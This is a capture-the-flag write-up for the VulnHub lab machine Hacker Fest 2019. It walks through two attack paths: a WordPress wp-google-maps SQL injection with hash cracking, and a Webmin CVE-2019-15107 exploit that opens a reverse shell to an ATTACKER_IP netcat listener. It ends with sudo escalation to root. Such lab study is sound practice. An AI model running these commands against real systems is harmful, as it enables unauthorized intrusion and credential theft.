# HF2019 — VulnHub

**CTF:** VulnHub  
**Date:** 2025-11-14  
**Category:** misc  
**Difficulty:** Grade 4  

---

## Summary

Hacker Fest 2019 is a very easy machine by Martin Haller made for the HackerFest 2019 workshop in Prague. It has two intended exploitation paths: WordPress plugin SQLi via `wp-google-maps`, or Webmin RCE via CVE-2019-15107. Both paths lead to the same `webmaster` user, who has full sudo rights.

---

## Reconnaissance

```bash
nmap -sC -sV -A -p- 192.168.1.x
```

Open ports:

```
21/tcp    open  ftp     vsftpd (anonymous login allowed)
22/tcp    open  ssh     OpenSSH
80/tcp    open  http    Apache (WordPress 5.2.3)
10000/tcp open  ssl/http Webmin 1.890
```

Anonymous FTP login was enabled — logged in and found `wp-config.php` revealing database credentials. Also confirmed WordPress was running on port 80.

---

## Path 1 — WordPress Plugin SQLi

### Enumeration

```bash
wpscan --url http://192.168.1.x -e ap,u
```

Found:
- User: **webmaster**
- Vulnerable plugin: **wp-google-maps** — unauthenticated SQL injection

### Exploitation via Metasploit

```bash
msfconsole
search wp-google-maps
use auxiliary/admin/http/wp_google_maps_sqli
set RHOSTS 192.168.1.x
run
```

Dumped WordPress user hashes. Cracked `webmaster`'s hash with John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

SSH'd in as `webmaster`:

```bash
ssh webmaster@192.168.1.x
```

---

## Path 2 — Webmin RCE (CVE-2019-15107)

Webmin 1.890 is vulnerable to an unauthenticated remote code execution via the password reset functionality.

```bash
git clone https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE.git
chmod +x webmin-1.890_exploit.py
```

Set up a netcat listener:

```bash
nc -lvnp 4444
```

Ran the exploit:

```bash
python webmin_exploit.py 192.168.1.x 10000 ATTACKER_IP 4444
```

Got a shell — also landed as `webmaster` (or directly as root depending on the path).

---

## Privilege Escalation — Sudo All

Checked sudo permissions:

```bash
sudo -l
```

Output:

```
(ALL : ALL) ALL
```

`webmaster` could run any command as root:

```bash
sudo su
```

Got a root shell and read the flag:

```bash
cat /root/proof.txt
```

---

## Flags

- **User flag** — `/home/webmaster/flag.txt`
- **Root flag** — `/root/proof.txt`
